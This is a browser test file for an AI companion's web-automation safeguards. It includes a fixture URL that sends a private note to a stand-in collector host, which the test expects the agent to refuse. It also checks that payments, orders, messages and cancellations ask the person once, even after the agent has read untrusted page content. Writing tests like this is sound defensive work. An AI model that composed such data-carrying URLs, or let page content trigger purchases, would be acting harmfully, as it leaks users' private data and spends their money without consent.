import assert from 'node:assert/strict';
import {withBrowser,fileAccess,worldUrl} from './browser-test.ts';
await withBrowser(fileAccess,async browser=>{
 const page=await browser.newPage({viewport:{width:1280,height:850},reducedMotion:'reduce'}),errors=[];page.on('pageerror',e=>{errors.push(e.message);console.error(e.message);});page.setDefaultTimeout(15000);
 await page.addInitScript(()=>{
  window.actions=[];(window as any).shows=[];
  window.webkit={messageHandlers:{worldlet:{async postMessage(b){
   if(b.action==='snapshot')return {workspaceId:'browser-check',revision:0,sources:[],knowledge:[],connections:[],onboarding:{completed:true},sampleEnabled:false,cloudConsent:true};
   if(b.action==='modelStatus')return {available:true,cloudAllowed:true};
   if(b.action==='weatherLoad')return null;
   if(b.action==='browserShow')(window as any).shows.push(b.url);
   if(b.action==='agentChat'&&b.text.startsWith('Open ')){
    const url=b.text==='Open the collector'?'https://collector.example/c?d=private-note':b.text.slice(5);
    const result=await worldletAgentTool(b.id,{name:'browse_web',id:crypto.randomUUID(),args:{operation:'open',url}});
    return {message:result.error||'Opened.'};
   }
   // Each request names the controls Fox uses: 1 Next page, 2 Pay $40, 3 Cancel free trial, 4 Place order, 5 Confirm cancellation.
   if(b.action==='agentChat'&&b.text.startsWith('Use ')){
    if(b.text.includes('after reading'))await worldletAgentTool(b.id,{name:'automate_browser',id:crypto.randomUUID(),args:{operation:'snapshot'}});
    let result;for(const ref of b.text.match(/\d/g)||[]){
     result=await worldletAgentTool(b.id,{name:'automate_browser',id:crypto.randomUUID(),args:{operation:'click',documentId:'fixture',ref}});if(result.error)break;
    }
    return {message:result?.error||'Action completed.'};
   }
   // Steps said in words: the host's quick choice (browserCommand pick below) names each control.
   if(b.action==='agentChat'&&b.text.startsWith('Do: ')){
    const result=await worldletAgentTool(b.id,{name:'automate_browser',id:crypto.randomUUID(),args:{operation:'do',steps:b.text.slice(4).split(' then ')}});
    return {message:result.error||'Did '+result.done.length+' steps.'};
   }
   if(b.action==='agentChat'){
    window.worldletAgentEvent(b.id,{type:'progress',name:'automate_browser',activity:'working'});
    const result=await worldletAgentTool(b.id,{name:'automate_browser',id:crypto.randomUUID(),args:{operation:/^(Submit|Send)/.test(b.text)?'submit':'click',documentId:'fixture',ref:b.text.startsWith('Send')?'message':'1'}});
    return {message:result.error||'Action completed.'};
   }
   if(b.action==='browserCommand'){
    actions.push(b.args?.operation||b.operation);
    if(b.args?.operation==='pick'){
     const page={ok:true,documentId:'fixture',text:'- button "Next page" [ref=e1]',untrustedContent:true};
     // "the hidden button" is further down: the first choice scrolls, the next finds it.
     if(b.args.step==='press the hidden button'&&!actions.includes('scroll'))return {ok:true,operation:'scroll',direction:'down',page,untrustedContent:true};
     const ref={'go to the next page':'1','press the hidden button':'1','place the order':'4'}[b.args.step];
     return ref?{ok:true,operation:'click',ref,documentId:'fixture',page,untrustedContent:true}:{error:'No control on this page matches “'+b.args.step+'”.',page,untrustedContent:true};
    }
    if(b.args?.operation==='snapshot')return {ok:true,documentId:'fixture',elements:[],untrustedContent:true};
    if(b.args?.operation==='prepare'&&b.args.intent==='submit')return b.args.ref==='message'?{ok:true,label:'Message Sam',role:'textbox',editable:true,url:'https://chat.example/sam',receipt:true}:{ok:true,label:'Search',role:'searchbox',editable:true,url:'https://shop.example/',receipt:true};
    if(b.args?.operation==='prepare')return {ok:true,label:{'1':'Next page','2':'Pay $40','3':'Cancel free trial','4':'Place order','5':'Confirm cancellation'}[b.args.ref],url:'https://www.shop.example/cart',receipt:true};
   }
   return {ok:true};
  }}}};
 });
 await page.goto(worldUrl());await page.locator('#worldStartup').waitFor({state:'detached',timeout:60000});
 const fox=page.locator('#notionInput'),bubble=page.locator('#companionDialogue'),input=page.locator('#notionInput');await fox.waitFor();
 // Model-composed, data-carrying navigation is refused without asking (#671).
 await fox.click();await input.fill('Open the collector');await input.press('Enter');
 await bubble.getByLabel('Current reply').getByText(/Not opened: this address carries extra data/).waitFor();
 await page.waitForFunction(()=>document.querySelector<HTMLElement>('#notionWorld').dataset.replyBusy==='false');
 assert.equal(await bubble.getByRole('button',{name:'Allow',exact:true}).count(),0,'Navigation never asks');
 assert.deepEqual(await page.evaluate(()=>[...(window as any).shows,...actions.filter(a=>a==='open')]),[],'Refused navigation opens nothing');
 // A URL the user typed opens directly.
 if(!await input.isVisible())await fox.click();await input.fill('Open https://docs.example.com/guide');await input.press('Enter');
 await page.waitForFunction(()=>(window as any).shows.includes('https://docs.example.com/guide'));
 assert.equal(await bubble.getByRole('button',{name:'Allow',exact:true}).count(),0,'User-given URL needs no approval');
 await page.waitForFunction(()=>document.querySelector<HTMLElement>('#notionWorld').dataset.replyBusy==='false');
 console.log('PASS composed navigation is refused without asking; user-given URL opens directly.');
 await page.reload();await page.locator('#worldStartup').waitFor({state:'detached',timeout:60000});await fox.waitFor();
 // Since #1923 a page opened from Fox shows over the World and a reload starts at the overview, so the page Fox
 // works in is opened again (it opens directly, as above).
 await input.fill('Open https://docs.example.com/guide');await input.press('Enter');
 await page.waitForFunction(()=>{const c=document.querySelector<HTMLElement>('#notionContent');return !c.hidden&&c.dataset.template==='browser';});
 await page.waitForFunction(()=>document.querySelector<HTMLElement>('#notionWorld').dataset.replyBusy==='false');
 // Ordinary clicks and a search run directly: no question and no wait (owner decision 2026-10-03).
 const busy=()=>page.waitForFunction(()=>document.querySelector<HTMLElement>('#notionWorld').dataset.replyBusy==='false');
 const say=async(text:string)=>{await page.evaluate(()=>{actions.length=0;});if(!await input.isVisible())await fox.click();await input.fill(text);await input.press('Enter');};
 const asks=()=>bubble.getByRole('button',{name:'Go ahead',exact:true}).count();
 for(const [text,operation] of [['Perform the browser action','click'],['Submit the search','submit']]){
  await say(text);
  await bubble.getByLabel('Current reply').getByText('Action completed.').waitFor();await busy();
  assert.equal(await asks(),0,operation+' must not ask');
  assert.deepEqual(await page.evaluate(()=>actions),['prepare',operation],operation+' executes directly');
 }
 console.log('PASS ordinary browser clicks and a search run directly without a question.');
 // The last step asks once, before it runs; Not now clicks nothing, Go ahead runs it, and
 // nothing asks afterwards.
 const lastStep=async(text:string,answer:'Go ahead'|'Not now',expected:string[],reply:RegExp)=>{
  await say(text);
  await bubble.getByRole('button',{name:'Go ahead',exact:true}).waitFor();
  assert.match(await bubble.textContent(),/Last step:/,text+': the question names the step');
  await bubble.getByRole('button',{name:answer,exact:true}).click();
  await bubble.getByLabel('Current reply').getByText(reply).waitFor();await busy();
  assert.equal(await asks(),0,text+': asked only once');
  for(const name of ['Mark done','It worked','Not yet'])assert.equal(await bubble.getByRole('button',{name,exact:true}).count(),0,text+': nothing is confirmed afterwards');
  assert.deepEqual(await page.evaluate(()=>actions),expected,text);
 };
 await lastStep('Use 4','Not now',['prepare'],/Not done: the person chose not to “Place order” now/);
 await lastStep('Use 1 then 4','Go ahead',['prepare','click','prepare','click'],/Action completed\./);
 await lastStep('Send the message','Go ahead',['prepare','submit'],/Action completed\./);
// A cancellation's "Are you sure?" page runs on the same Go ahead: one question for both pages.
await lastStep('Use 3 then 5','Go ahead',['prepare','click','prepare','click'],/Action completed\./);
 // After an untrusted snapshot the page still never answers for the person: a payment asks
 // the same way, whatever the request says, and ordinary steps still run directly.
 await lastStep('Use 2 after reading','Not now',['snapshot','prepare'],/Not done: the person chose not to “Pay \$40” now/);
 await lastStep('Use 1 then 3 after reading','Go ahead',['snapshot','prepare','click','prepare','click'],/Action completed\./);
 // Steps said in words run through the same path: ordinary steps directly, the last step asks once.
 await lastStep('Do: go to the next page then place the order','Not now',['pick','prepare','click','pick','prepare'],/Not done: the person chose not to “Place order” now/);
 await lastStep('Do: go to the next page then place the order','Go ahead',['pick','prepare','click','pick','prepare','click'],/Did 2 steps\./);
 await say('Do: press the hidden button');await bubble.getByLabel('Current reply').getByText('Did 1 steps.').waitFor();await busy();
 assert.deepEqual(await page.evaluate(()=>actions),['pick','scroll','pick','prepare','click'],'a control further down is scrolled to first');
 await say('Do: open the settings');await bubble.getByLabel('Current reply').getByText(/No control on this page matches/).waitFor();await busy();
 assert.deepEqual(await page.evaluate(()=>actions),['pick'],'no matching control clicks nothing');
 console.log('PASS steps said in words: each control picked once, run in order through the same rules; the last step still asks once.');
 assert.deepEqual(errors,[]);console.log('PASS the last step that pays, orders, sends or cancels asks once before it runs, also after reading a page; nothing asks afterwards.');
});
